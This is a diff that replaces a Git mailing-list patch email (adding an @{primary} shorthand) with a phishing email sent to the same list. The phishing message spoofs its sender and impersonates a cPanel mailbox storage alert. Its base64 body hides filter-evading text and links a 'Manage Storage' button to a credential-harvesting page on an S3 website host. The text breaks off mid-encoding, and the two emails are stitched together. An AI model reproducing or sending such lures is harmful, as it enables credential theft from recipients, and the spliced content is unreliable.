@@ -1,398 +1,194 @@
-Received: from mail-qk1-f173.google.com (mail-qk1-f173.google.com [209.85.222.173])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from sgmrmt41-fen.alpha-prm.jp (sgmrmt41-fen.alpha-prm.jp [157.205.202.135])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3505C2C86D
-	for <git@vger.kernel.org>; Sat, 31 Jan 2026 00:06:29 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.222.173
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C6AB84A3C
+	for <git@vger.kernel.org>; Sat, 31 Jan 2026 00:08:18 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=157.205.202.135
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1769817992; cv=none; b=tq6KJDOUnGS4XrCN5UuXsI8titnPKxAPwgZcDyjtGG/WP568ZDk7Csn3Cy7Q5UfzvImpwkGA2+0YKd5IBbe+JKNh6fXK5o8CH9QbnZd+sc7jCukX2S6epP0LX+MDvp2DvIOxFtS67gr7G5D9uE1ZgN6vmQpbbAcLMUTMCg1QiPc=
+	t=1769818102; cv=none; b=jKLXU9dPciRdbasvreUo3gumGTrx4pOd/NVhASqFbzaR2vGJVlMlay7uxxvbk1zHOmbk3cYcMbzVLeRCNgMX7Ygy5bpO1oSxDeHJKXpN4mUMjzOksIYucd/73h+12X6fzCIcugPWCA3YN7ytY5a/i6C3q9/9JFMYyGe8fL+pTYo=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1769817992; c=relaxed/simple;
-	bh=ZXvXAyORNG/O474ukfYiENjBCf7vg59H9c1J3aqctDE=;
-	h=Message-Id:In-Reply-To:References:From:Date:Subject:Content-Type:
-	 MIME-Version:To:Cc; b=GFpPyVF+Y8652ctgtm4TiZ5zQTHB3i2xXSw16U6KhJTlBQDnsTEMTPqTmbIggT4pKfCH1lPWoIduloIbN6CEcai4dF2jmpqLXwENEFPkM1T/Zu/LUqhoJbsX8pbZqTSNzudzRstjSVvLFs4V8+9k9uRjYlHEyLrMBZSGcm5NHGA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=H0D9Erqu; arc=none smtp.client-ip=209.85.222.173
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1769818102; c=relaxed/simple;
+	bh=RtzEzgohN/DVoKZIC18Ei/FecBetPUjb+HVOB24vlDY=;
+	h=Content-Type:MIME-Version:MIME-Version:Message-ID:Subject:From:To:
+	 Date; b=t/MBBlTgZOMlKtlhbLpuz66HnwXBJ/68Rr1YJzqonuEdUDhksyZJhQ3mIhmgximonpJwrz1wXh0DKUNnFtzdBe1vysFKQe7ASSUw8mi4g7yQvTfK9kJ81hLNRWo+SxJmQJ7l+VuCNCae6q/A3zh1gjS1Mtu434RoREpn5a6rl0w=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=tokia.co.jp; spf=pass smtp.mailfrom=nikka-densok.co.jp; dkim=pass (2048-bit key) header.d=alpha-prm.jp header.i=@alpha-prm.jp header.b=ZyBlfy9I; arc=none smtp.client-ip=157.205.202.135
+Authentication-Results: smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=tokia.co.jp
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nikka-densok.co.jp
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="H0D9Erqu"
-Received: by mail-qk1-f173.google.com with SMTP id af79cd13be357-8c6a7638f42so377602485a.2
-        for <git@vger.kernel.org>; Fri, 30 Jan 2026 16:06:29 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1769817989; x=1770422789; darn=vger.kernel.org;
-        h=cc:to:mime-version:content-transfer-encoding:fcc:subject:date:from
-         :references:in-reply-to:message-id:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=PIhPmxKXwv9syBOIpdSP8Uu2JQkyCqRJmw6i+J+0JpQ=;
-        b=H0D9ErquAJwyFtYyT8Dyl0qMiohF5EADpDpTVHqDs/JLJ15raNq+8E7pZ8zap12yP0
-         FwRcLeOMRXNZ0gheGUEu/NXIfGbXpHIFZP4AqNlPTltAms95bLobsQqKfc5gKT29ByXh
-         CiqTFMgJTPKJ0+l9+LiyyrYIB0QVPtltDm0sQWLkzrcnRI7nvvXr39hmYutMEQGpb0r8
-         1riu+5/XmBACCz45kJ3KmoEWVwCI9aB4PW/SZp0/iFvwEh8CRGnG9rmUrKwviHkE4Dox
-         PbBvRgtc4EqFLiinzZsKEXKMWBTZ320JglCE2uT2AZU6UFh67UUakccea0SAHJMdaTAq
-         +F6A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1769817989; x=1770422789;
-        h=cc:to:mime-version:content-transfer-encoding:fcc:subject:date:from
-         :references:in-reply-to:message-id:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to;
-        bh=PIhPmxKXwv9syBOIpdSP8Uu2JQkyCqRJmw6i+J+0JpQ=;
-        b=mYSBxlRiYlPUNAcbWym+qPeBoUCGa+ACbzbaz8sOlbKViD855iCIEqcNxB7t3sjo0q
-         zFTRS50JWH9tEbxpV281Al5tvlZDgDKHk75efawYjpaICL+XtZm/44iOGHJO8mH38zYc
-         1tJf4eal29x88C1OCD+KG/BVyIE9sMH46kCdjAonackSU2kU5715165xlhaTYzvHwNzX
-         WkdRcRsC3H1/7qfK409dx+MsBvfpKfvV5T95dBqqknFYHCvOUUxh7Fei59Psjm0ukWxW
-         fJawaU6/3hUZPiORToGfUW+7G8nS2MPzqme9+4uJi729w8Uido5P5IVDpBgLymLc2zM2
-         ejTw==
-X-Gm-Message-State: AOJu0YwFedzFLJjIL5U8jll4mLCx3WFy9JZWOgEyPoyGzUaHTSMyYCw6
-	uitacS0RyxnckXxLYYVJduKlFxG0E1vp8HJE+mKmQIZXT4EGZPL15Lp7TP6Tbw==
-X-Gm-Gg: AZuq6aJPg13xwo2GJ+KvdwalmP6vUF9LHv4tG1ruhj/yBUHnve+cCCUuFYld71fcA2L
-	L9fbBwVh0MyRNBWACWJVHjDQlFOfv4CKcxsUTefx2p4cqiGtf4BBiilfBDXJ/nMZxT6zpgR7cmy
-	WCuW6oRteM8y0OWjbmmCWPK2gjGlrpZ09ALu+GGiwcZ+aj0h43Qws9CjfqxFMnM8a0abm6CVaGl
-	sYztCWmrNl/a4kU0n8SaYkrH1/XG5uBABvfk1scVekLy1b/5bOYoF70RMWGze/HsANAPhKmUT7j
-	bCwUqUNYGoZUB1za8aJeghVmTMOvoO9pwe2rKQghUVI+R64ddMiXSJ4oEUzdCROYdou3pPAnIlq
-	7NL/MAzi3wyK7Pc6wX1eILnYN3IwNzAhUv2CyGT5m1IFaVj3zQGub1pf+JZfJRAS7v2mmVhLxT1
-	9DBOG5NqmUb1+6eQ==
-X-Received: by 2002:a05:620a:690d:b0:8b2:e069:6911 with SMTP id af79cd13be357-8c9eb2e84a3mr718247585a.59.1769817988603;
-        Fri, 30 Jan 2026 16:06:28 -0800 (PST)
-Received: from [127.0.0.1] ([172.178.119.34])
-        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-894d376e0d8sm67616106d6.53.2026.01.30.16.06.27
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Fri, 30 Jan 2026 16:06:28 -0800 (PST)
-Message-Id: <pull.2183.v4.git.git.1769817987594.gitgitgadget@gmail.com>
-In-Reply-To: <pull.2183.v3.git.git.1769805948018.gitgitgadget@gmail.com>
-References: <pull.2183.v3.git.git.1769805948018.gitgitgadget@gmail.com>
-From: "Harald Nordgren via GitGitGadget" <gitgitgadget@gmail.com>
-Date: Sat, 31 Jan 2026 00:06:27 +0000
-Subject: [PATCH v4] revisions: add @{primary} shorthand for primary branch
-Fcc: Sent
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
+	dkim=pass (2048-bit key) header.d=alpha-prm.jp header.i=@alpha-prm.jp header.b="ZyBlfy9I"
+Received: from sgmmta61-fen.alpha-prm.jp ([157.205.202.193])
+          by sgmmta43.alpha-prm.jp with ESMTP
+          id <20260130233440.SFAX790363.sgmmta43.alpha-prm.jp@sgmmta61-fen.alpha-prm.jp>
+          for <git@vger.kernel.org>; Sat, 31 Jan 2026 08:34:40 +0900
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=alpha-prm.jp; s=alm01; t=1769816080; 
+        bh=RtzEzgohN/DVoKZIC18Ei/FecBetPUjb+HVOB24vlDY=;
+        h=MIME-Version:MIME-Version:Message-ID:Subject:From:To:Date:Reply-To;
+        b=ZyBlfy9IM5qNvvRxfhM0miFNRvetK169dOOI0UmgKN9ueP5Skzwa0e3SUp1cHMvTZWeRuCOfzUwTUznZL7K5+8i2duOMFmij8dNKNHs34N2ulD/gk0oza2ZoYLVRugjudFpbSpJO7Mv4kwct/FEnjM0yPcpirVajFWcT/Qr/dU6IC/bxvejLDeMZg8W4J47/YcOGfmEQmWmNXrDTEV1AVTWh6ojAbZoJt8kCZBQUeA9zxuHiObEM/V5SZ+4rydBFKOJOH+r2QJsuTCj+ussFTxyT5ENG5QQUjIYElkkHgrILPp/ro5wfoEPchAEfj32A6iBBT+zEM5n0ft32mH6PHQ==
+Received: from sgmtsf13_tsfppi.alpha-prm.jp ([157.205.230.86])
+          by sgmmta61.alpha-prm.jp with ESMTP
+          id <20260130233440.WYCA960457.sgmmta61.alpha-prm.jp@sgmtsf13_tsfppi.alpha-prm.jp>
+          for <git@vger.kernel.org>; Sat, 31 Jan 2026 08:34:40 +0900
+Received: from sgmtsf13_tsfppo.alpha-prm.jp (localhost [127.0.0.1])
+	by sgmtsf13_tsfppi.alpha-prm.jp (Postfix) with ESMTP id 3A07F4000074
+	for <git@vger.kernel.org>; Sat, 31 Jan 2026 08:34:40 +0900 (JST)
+Received: from sgmtsf13_tsfccm.alpha-prm.jp (localhost [127.0.0.1])
+	by sgmtsf13_tsfppo.alpha-prm.jp (Postfix) with ESMTP id 395E5400007F
+	for <git@vger.kernel.org>; Sat, 31 Jan 2026 08:34:40 +0900 (JST)
+Received: from sgmmsa51.alpha-prm.jp (sgmmsa51-fen.alpha-prm.jp [157.205.201.10])
+	by sgmtsf13_tsfccm.alpha-prm.jp (Postfix) with ESMTP id 35D544000074
+	for <git@vger.kernel.org>; Sat, 31 Jan 2026 08:34:40 +0900 (JST)
+Received: from WIN-ORNOODIEFLB.cs1local ([142.91.108.197])
+          by sgmmsa51.alpha-prm.jp with ESMTP
+          id <20260130233440.ZXCC4119745.sgmmsa51.alpha-prm.jp@WIN-ORNOODIEFLB.cs1local>
+          for <git@vger.kernel.org>; Sat, 31 Jan 2026 08:34:40 +0900
+X-RazorGate-Vade: dmFkZTFU+TrCcLuJThHKelv9p+PdR/XfHq44KIjYE0ksqk2JqqlNzTSlgly4xjuaPm17tkhwxMBiD3dD49nrdeFEJJfORy27rdtFrEO8QzJ2kI6MZdO1iXXefR9m+6X1VSB2ghM2HhdS8F7uh6pLXi+bmMLEjTIAFT8Mppxl6N99taU6PRijeQaIcA/3TciOuWtrFx9Wr4EtjOeExA6AY8JV8QX6b3tf5xwQ/HyO9QdqSohy23W8A0SkDfZHZuU2VMNaOS4Hk2IjeezQceHAtUv0ozJUXfm26kV2NK7PtHKwwvLXf/QGCp36z4/kwhtq49VgNIvrCXVgYaAr2faeMgmpkm5ggPOyh+3PPtcAq8rm089BNwPE5Iqwvi9tisyPKpWpZhpchiZByQRmscw1/AEWdHNI3D4hh/A3kuYHii55mWz6bpk7LWLJ5gmx+tAzfIfoOrdf9Ewnf07Tv75KSIEnrj7V/NGVQEuUz6MY6XirIC1bEt226Hg0EhLMiayBHfBEvpgvEpf45iqJEXrOQBoLqTBrQ5TyelhuG7HZ8sxwhY5Vi1h47TQJEt5sVgzMwRPRJlsj73tE0Fbgm167Oq7DbkfH0mFjan04aPOtFYviW/P6MmOVyCPvv0/01iL0MUf+DdKVmacc5y83uNzVnFWO9OaARw1fuAAQfnbyF26Co5ljrFeBd3ZdHbXrLuSRLgm8cQ07Mka4ALDKoKZPf76semyLSLETWW7++uFtwIEuvXoOUCQmEtkGSKirXKg9wsx88kOnE7WG/FiUmP7OoqPnbajFoHBtkTVRpxaEwmkF8fPLpQeUKCHzAA+B4rHYLCTPEI3gSD7eE4alHrVNJt+ewOejDGdgAXV4RrJuPtZ2xndQt6kJ6wMx9MF2I0wty6sKOFUkzAIBnj0YtEslkC2txzycdufOnwDQWv6X/8mTBaPzAHaEwu4Ze0gim2+IulNLBDljZGgz
+ F9HEBmqx
+	7893pHa1mF1mlz6zf13ynJL4SvXhzOu1AcnEcfA+ZU0O0otJ6Jk
+Content-Type: multipart/mixed; boundary="===============1842154033582965411=="
 Precedence: bulk
 X-Mailing-List: git@vger.kernel.org
 List-Id: <git.vger.kernel.org>
 List-Subscribe: <mailto:git+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:git+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
+MIME-Version: 1.0
+Message-ID: <BY5PR10MB2663.D782F9F185C82B40@tokia.co.jp>
+X-Mailer: Microsoft Office Outlook 12.0
+User-Agent: Outlook-iOS/4.2126.0 (iPhone13,2; iOS 15.1.1)
+X-Priority: 3
+Importance: Normal
+Priority: normal
+X-Spam-Score: -2.7
+X-Spam-Level: 
+X-MS-Has-Attach: no
+X-MS-TNEF-Correlator: <43b97af3-6e53-42f4-bbd2-81167ddd9094@tokia.co.jp>
+Authentication-Results: spf=pass smtp.mailfrom=tokia.co.jp; dkim=pass header.d=tokia.co.jp; dmarc=pass
+Received-SPF: Pass (protection.outlook.com: domain of Zendeskservicedesk+helpdesk+auto+admin+extention+zendesk.teams@tokia.co.jp designates 40.107.146.172 as permitted sender)
+Subject: ACTION REQUIRED: Release Emails Held in Secure Quarantine
+From: "Webmail.Email.Policy.Office" <Zendeskservicedesk+helpdesk+auto+admin+extention+zendesk.teams@tokia.co.jp>
 To: git@vger.kernel.org
-Cc: Harald Nordgren <haraldnordgren@gmail.com>,
-    Harald Nordgren <haraldnordgren@gmail.com>
+Date: Fri, 30 Jan 2026 15:34:40 -0800
+Reply-To: noreplyssa@ssagovbenefitsdocuments.com
 
-From: Harald Nordgren <haraldnordgren@gmail.com>
+--===============1842154033582965411==
+Content-Type: multipart/alternative; boundary="===============0807376524191923686=="
+MIME-Version: 1.0
 
-Git already has shorthands like @{upstream} and @{push} to refer to
-tracking branches, but there is no convenient way to refer to the
-primary branch of a repository (typically "main" or "master").
+--===============0807376524191923686==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
 
-Users often want to switch to the primary branch regardless of its
-name, especially when working across repositories with different
-primary branch names. Currently they must either hardcode the branch
-name or query it via configuration, which is cumbersome.
+QnVzaW5lc3MgbWF0ZXJpYWxzIGZvciByZXZpZXcgYW5kIGNvbnNpZGVyYXRpb25zZXNzaW9uX2Iw
+NzZkZmNkLTY3YmYtNDBjNi04OTUxLWU5MjU5NmRjZjg5OAoKCgoKCgoKCgoKICAgICAgICAgICAg
+ICAgICAgICBNYWlsYm94IFN0b3JhZ2UgQWxlcnQgZm9yICJnaXRAdmdlci5rZXJuZWwub3JnIi4K
+ICAgICAgICAgICAgICAgICAgcmVjaXBpZW50XzZkOGUxODAwMzMxMwoKCgoKCgrCoAoKWW91ciBt
+YWlsYm94ICJnaXRAdmdlci5rZXJuZWwub3JnIiBpcyBuZWFyaW5nIGl0cyBzdG9yYWdlIGxpbWl0
+LgpVc2FnZTogOTEuMjYlICgyMjguMTUgTUIgb2YgMjUwIE1CKS4Kd2UgYXNrIHRoYXQgeW91IGRl
+bGV0ZSB1bm5lY2Vzc2FyeSBlbWFpbHMgb3IgdXBncmFkZSB5b3VyIHF1b3RhIHRvIGF2b2lkIG1p
+c3NpbmcgaW5jb21pbmcgbWVzc2FnZXMuIFVzZSB0aGUgRW1haWwgRGlzayBVc2FnZSB0b29sIGJl
+bG93OgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTWFuYWdlIFN0b3JhZ2UKICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgIApJZiB5b3UgbmVlZCBhc3Npc3RhbmNlLCBjb250YWN0IHlv
+dXIgc3lzdGVtIGFkbWluaXN0cmF0b3IgdG8gaW5jcmVhc2UgeW91ciBxdW90YS4KCsKgCgoKCgpO
+b3RpZmljYXRpb24gZ2VuZXJhdGVkIG9uIDIwMjYtMDEtMzAgLDE1OjM0OjQwICAoVVRDKS4KWW91
+IG1heSBkaXNhYmxlICJRdW90YTo6TWFpbGJveFdhcm5pbmciIG5vdGlmaWNhdGlvbnMgaW4gY1Bh
+bmVsOiBtb2RpZnkgTm90aWZpY2F0aW9uIFNldHRpbmdzClRoaXMgaXMgYW4gYXV0b21hdGVkIG1l
+c3NhZ2U7IHdlIGFzayB0aGF0IHlvdSBkbyBub3QgcmVwbHkuCgpidXNpbmVzc181NDczMQoKCnNh
+bHRfNTQxNmIwNzY2MmNlZDVmNAoKCgoKCsKpIDIwMjYgY1BhbmVsLCBMLkwuQy4KCgoKCgoKCgoK
+CgpUaGlzIGlzIGEgcHJvZmVzc2lvbmFsIGJ1c2luZXNzIGNvbW11bmljYXRpb24uCgpVbnN1YnNj
+cmliZSB8IAogICAgICAgICAgICAgICAgTWFuYWdlIFByZWZlcmVuY2VzCgpCdXNpbmVzcyBDb21t
+dW5pY2F0aW9uIOKAoiBQcm9mZXNzaW9uYWwgU2VydmljZXMKCg==
 
-Add a new @{primary} shorthand that resolves to the primary branch
-as determined by init.defaultBranch (or falls back to "main" or
-"master" depending on Git version). This allows users to write:
+--===============0807376524191923686==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
 
-  git checkout @{primary}
+PHNwYW4gY2xhc3M9InByZWhlYWRlciIgc3R5bGU9ImRpc3BsYXk6bm9uZSAhaW1wb3J0YW50OyB2
+aXNpYmlsaXR5OmhpZGRlbiAhaW1wb3J0YW50OyBvcGFjaXR5OjAgIWltcG9ydGFudDsgY29sb3I6
+dHJhbnNwYXJlbnQgIWltcG9ydGFudDsgaGVpZ2h0OjAgIWltcG9ydGFudDsgd2lkdGg6MCAhaW1w
+b3J0YW50OyBsaW5lLWhlaWdodDowICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTowICFpbXBvcnRhbnQ7
+IG1zby1oaWRlOmFsbCAhaW1wb3J0YW50OyI+QnVzaW5lc3MgbWF0ZXJpYWxzIGZvciByZXZpZXcg
+YW5kIGNvbnNpZGVyYXRpb248L3NwYW4+PGRpdiBzdHlsZT0iaGVpZ2h0OjA7IHdpZHRoOjA7IGxl
+ZnQ6LTk5OTlweDsgZGlzcGxheTpub25lOyBvdmVyZmxvdzpoaWRkZW47IHRvcDotOTk5OXB4OyBw
+b3NpdGlvbjphYnNvbHV0ZTsiPnNlc3Npb25fYjA3NmRmY2QtNjdiZi00MGM2LTg5NTEtZTkyNTk2
+ZGNmODk4PC9kaXY+PGRpdiBpZD0iZWRpdGJvZHkxIiBzdHlsZT0iYmFja2dyb3VuZDogI0Y0RjRG
+NDsiPgo8ZGl2IHN0eWxlPSJtYXJnaW46IDA7IHBhZGRpbmc6IDA7IGJhY2tncm91bmQ6ICNGNEY0
+RjQ7Ij4KPHRhYmxlIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjEwIiBjZWxsc3BhY2luZz0iMCIg
+c3R5bGU9IndpZHRoOiAxMDAlOyIgd2lkdGg9IjEwMCUiPgo8dGJvZHk+CjxtZXRhIGNvbnRlbnQ9
+InRpbWVzdGFtcF8xNzY5ODE2MDgwMDMzNjI2IiBuYW1lPSJidXNpbmVzcy1pZCIvPjx0cj4KPHRk
+IGFsaWduPSJjZW50ZXIiPgo8dGFibGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNw
+YWNpbmc9IjAiIGNsYXNzPSJiaXpfMTgzMyIgc3R5bGU9Im1heC13aWR0aDogNjgwcHg7IGJvcmRl
+cjogMDsgd2lkdGg6IDEwMCU7Ij4KPHRib2R5Pgo8dHI+Cjx0ZCBoZWlnaHQ9IjI1IiBzdHlsZT0i
+Zm9udC1zaXplOiAxNnB4OyBjb2xvcjogIzMzMzMzMzsgZm9udC1mYW1pbHk6ICdIZWx2ZXRpY2Eg
+TmV1ZScsSGVsdmV0aWNhLEFyaWFsLHNhbnMtc2VyaWY7IiB3aWR0aD0iNjgwIj4KPGltZyBhbHQ9
+IldlYm1haWwgTG9nbyIgc3JjPSJodHRwczovL2VuY3J5cHRlZC10Ym4wLmdzdGF0aWMuY29tL2lt
+YWdlcz9xPXRibjpBTmQ5R2NRNld2SHBuczdfU09jWlphSV9tSjhPN0hiQmJ1NllELWh0VncmYW1w
+O3MiIHN0eWxlPSJ2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOyB3aWR0aDogMTIwcHg7IG1hcmdpbi1y
+aWdodDogMTBweDsgaGVpZ2h0OiAyNHB4OyIvPgogICAgICAgICAgICAgICAgICAgIE1haWxib3gg
+U3RvcmFnZSBBbGVydCBmb3IgImdpdEB2Z2VyLmtlcm5lbC5vcmciLgogICAgICAgICAgICAgICAg
+ICA8L3RkPjxkaXYgc3R5bGU9ImRpc3BsYXk6bm9uZTsgd2lkdGg6MDsgdG9wOi05OTk5cHg7IGxl
+ZnQ6LTk5OTlweDsgaGVpZ2h0OjA7IHBvc2l0aW9uOmFic29sdXRlOyBvdmVyZmxvdzpoaWRkZW47
+Ij5yZWNpcGllbnRfNmQ4ZTE4MDAzMzEzPC9kaXY+CjwvdHI+Cjx0cj4KPHRkIHN0eWxlPSJib3Jk
+ZXItYm90dG9tOiAycHggc29saWQgI0ZGNkMyQzsgcGFkZGluZzogMTVweCAwIDIwcHggMDsgYmFj
+a2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsgYm9yZGVyOiAycHggc29saWQgI0U4RThFODsiPgo8dGFi
+bGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiIHN0eWxlPSJmb250
+LWZhbWlseTogJ0hlbHZldGljYSBOZXVlJyxIZWx2ZXRpY2EsQXJpYWwsc2Fucy1zZXJpZjsgYmFj
+a2dyb3VuZDogI0ZGRkZGRjsiIHdpZHRoPSIxMDAlIj4KPHRib2R5Pgo8dHI+Cjx0ZCB3aWR0aD0i
+MTUiPsKgPC90ZD4KPHRkIHdpZHRoPSI2NTAiPgo8cD5Zb3VyIG1haWxib3ggIjxzdHJvbmc+Z2l0
+QHZnZXIua2VybmVsLm9yZzwvc3Ryb25nPiIgaXMgbmVhcmluZyBpdHMgc3RvcmFnZSBsaW1pdC48
+L3A+CjxwPlVzYWdlOiA8c3Ryb25nPjkxLjI2JSAoMjI4LjE1IE1CIG9mIDI1MCBNQik8L3N0cm9u
+Zz4uPC9wPjxtZXRhIGNvbnRlbnQ9InV1aWRfNjZmNTM2MGVhN2M2NDIxNiIgbmFtZT0iYnVzaW5l
+c3MtaWQiLz4KPHA+d2UgYXNrIHRoYXQgeW91IGRlbGV0ZSB1bm5lY2Vzc2FyeSBlbWFpbHMgb3Ig
+dXBncmFkZSB5b3VyIHF1b3RhIHRvIGF2b2lkIG1pc3NpbmcgaW5jb21pbmcgbWVzc2FnZXMuIFVz
+ZSB0aGUgRW1haWwgRGlzayBVc2FnZSB0b29sIGJlbG93OjwvcD4KPGEgaHJlZj0iaHR0cDovL3dl
+Ym1haWwyMDk2MTI2NWEwLTgzMjdkYmJjLWJmNmI1NmNjZjJjMTg1YzguczMtd2Vic2l0ZS11cy1l
+YXN0LTEuYW1hem9uYXdzLmNvbS8jZ2l0QHZnZXIua2VybmVsLm9yZyIgcmVsPSJub29wZW5lciBu
+b3JlZmVycmVyIiBzdHlsZT0iY29sb3I6ICNmZmZmZmY7IHBhZGRpbmc6IDEycHggMjVweDsgbWFy
+Z2luOiAxNXB4IDA7IGJvcmRlci1yYWRpdXM6IDRweDsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyBi
+YWNrZ3JvdW5kLWNvbG9yOiAjRkY2QzJDOyBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7IiB0YXJnZXQ9
+Il9ibGFuayI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1hbmFnZSBTdG9yYWdlCiAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+CjxwPklmIHlvdSBuZWVkIGFzc2lzdGFuY2Us
+IGNvbnRhY3QgeW91ciBzeXN0ZW0gYWRtaW5pc3RyYXRvciB0byBpbmNyZWFzZSB5b3VyIHF1b3Rh
+LjwvcD4KPC90ZD4KPHRkIHdpZHRoPSIxNSI+wqA8L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFu
+PSIzIj4KPGRpdiBjbGFzcz0iYml6XzQyMjIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxMHB4OyBjb2xv
+cjogIzY2NjY2NjsgYm9yZGVyLXRvcDogMnB4IHNvbGlkICNFOEU4RTg7IGZvbnQtZmFtaWx5OiAn
+SGVsdmV0aWNhIE5ldWUnLEhlbHZldGljYSxBcmlhbCxzYW5zLXNlcmlmOyBmb250LXNpemU6IDEy
+cHg7IHBhZGRpbmctdG9wOiA1cHg7Ij4KPHAgY2xhc3M9ImJpel8zODc5IiBzdHlsZT0ibWFyZ2lu
+OiA1cHggMDsiPk5vdGlmaWNhdGlvbiBnZW5lcmF0ZWQgb24gMjAyNi0wMS0zMCAsMTU6MzQ6NDAg
+IChVVEMpLjwvcD4KPHA+WW91IG1heSBkaXNhYmxlICJRdW90YTo6TWFpbGJveFdhcm5pbmciIG5v
+dGlmaWNhdGlvbnMgaW4gY1BhbmVsOiA8YSBocmVmPSJodHRwczovL2V4cGVydGVuLmNvbS5teDoy
+MDgzLz9nb3RvX2FwcD1Db250YWN0SW5mb19DaGFuZ2UiIHJlbD0ibm9vcGVuZXIgbm9yZWZlcnJl
+ciIgdGFyZ2V0PSJfYmxhbmsiPm1vZGlmeSBOb3RpZmljYXRpb24gU2V0dGluZ3M8L2E+PC9wPgo8
+cD5UaGlzIGlzIGFuIGF1dG9tYXRlZCBtZXNzYWdlOyB3ZSBhc2sgdGhhdCB5b3UgZG8gbm90IHJl
+cGx5LjwvcD4KPC9kaXY+CjwvdGQ+PGRpdiBzdHlsZT0iaGVpZ2h0OjFweDsgcG9zaXRpb246YWJz
+b2x1dGU7IHdpZHRoOjFweDsgbGVmdDotOTk5OXB4OyBvdmVyZmxvdzpoaWRkZW47Ij5idXNpbmVz
+c181NDczMTwvZGl2PjwhLS0gQnVzaW5lc3MgUmVmZXJlbmNlOiByZWZfMjAyNjAxMzAxNTM0NDAw
+MzM2MjYgLS0+CjwvdHI+CjwvdGJvZHk+CjwvdGFibGU+PGRpdiBjbGFzcz0iYml6Xzk5OTgiIHN0
+eWxlPSJsZWZ0Oi05OTk5cHg7IGhlaWdodDoxcHg7IHBvc2l0aW9uOmFic29sdXRlOyBvdmVyZmxv
+dzpoaWRkZW47IHdpZHRoOjFweDsiPnNhbHRfNTQxNmIwNzY2MmNlZDVmNDwvZGl2Pgo8L3RkPgo8
+L3RyPgo8dHI+Cjx0ZCBhbGlnbj0iY2VudGVyIiBzdHlsZT0icGFkZGluZy10b3A6IDEwcHg7Ij4K
+PGltZyBhbHQ9ImNQIiBzcmM9Imh0dHBzOi8vZW5jcnlwdGVkLXRibjAuZ3N0YXRpYy5jb20vaW1h
+Z2VzP3E9dGJuOkFOZDlHY1JYZU5sQ3RKcElqWDBNaWVCMEpkdHg1eEkyaUtMLUFVSkNZdyZhbXA7
+cyIgc3R5bGU9ImhlaWdodDogMjVweDsgYm9yZGVyOiAwOyBsaW5lLWhlaWdodDogMTAwJTsgd2lk
+dGg6IDQwcHg7Ii8+CjxwIHN0eWxlPSJmb250LWZhbWlseTogJ0hlbHZldGljYSBOZXVlJyxIZWx2
+ZXRpY2EsQXJpYWwsc2Fucy1zZXJpZjsgZm9udC1zaXplOiAxMnB4OyBtYXJnaW46IDVweCAwIDA7
+IGNvbG9yOiAjNjY2NjY2OyI+wqkgMjAyNiBjUGFuZWwsIEwuTC5DLjwvcD4KPC90ZD4KPC90cj4K
+PC90Ym9keT4KPC90YWJsZT4KPC90ZD4KPC90cj4KPC90Ym9keT4KPC90YWJsZT4KPC9kaXY+Cjwv
+ZGl2PgoKICAgICAgICA8ZGl2IHN0eWxlPSJtYXJnaW4tdG9wOiAzMHB4OyBwYWRkaW5nLXRvcDog
+MTVweDsgYm9yZGVyLXRvcDogMXB4IHNvbGlkICNlMGUwZTA7IGZvbnQtc2l6ZTogMTFweDsgY29s
